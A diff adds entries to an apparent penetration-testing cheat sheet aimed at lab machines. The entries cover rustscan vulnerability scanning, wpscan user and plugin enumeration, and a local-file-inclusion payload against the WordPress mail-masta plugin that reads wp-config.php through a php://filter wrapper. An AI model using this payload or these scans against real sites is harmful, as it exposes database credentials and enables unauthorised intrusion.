@@ -405,5 +405,41 @@
       "shares"
     ],
     "category": "commands"
+  },
+  {
+    "id": 34,
+    "title": "rustscan (enumerating ports with Rustscan)",
+    "content": "<copycode>\nsudo rustscan -a 10.10.29.138 -- -sV -sC -A -vvvv --script=vuln\n</copycode>",
+    "keywords": [
+      "rustscan",
+      "ports",
+      "enum"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 35,
+    "title": " PHP Wrappers (if enabled) , access manipulation, bypass restrictions",
+    "content": "If the server has PHP wrappers enabled, use them to bypass restrictions. For example, use the<br>\n php://filter wrapper to base64 encode the output and avoid detection:<br>\n<copycode>\nhttp://10.10.145.93/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php\n</copycode>\n<br>\n<copycode>\necho \"BASE64_CONTENT\" | base64 -d\n</copycode>",
+    "keywords": [
+      "php",
+      "wrapper",
+      "wordress",
+      "access",
+      "manipulation",
+      "bypass",
+      "restriction"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 36,
+    "title": "wpscan commands",
+    "content": "Scan a WordPress Website:<br>\n<copycode>\nwpscan --url https://example.com\n</copycode><br>\nUse an API Token for Vulnerability Data:<br>\n<copycode>\nwpscan --url https://example.com --api-token YOUR_TOKEN\n</copycode><br>\nScan for Vulnerable Plugins:<br>\n<copycode>wpscan --url https://example.com --enumerate p</copycode><br>\nScan for Vulnerable Themes:<br>\n<copycode>wpscan --url https://example.com --enumerate t</copycode><br>\nScan for WordPress Users<br>\n<copycode>\nwpscan --url https://example.com --enumerate u\n<copycode><br>\nCustomizing the Timeout (useful for slow servers):<br>\n<copycode>\nwpscan --url https://example.com --request-timeout 60\n</copycode><br>\nEnable Verbose Mode (for detailed output):<br>\n<copycode>\nwpscan --url https://example.com --verbose\n</copycode>",
+    "keywords": [
+      "wpscan",
+      "commands"
+    ],
+    "category": "commands"
   }
 ]
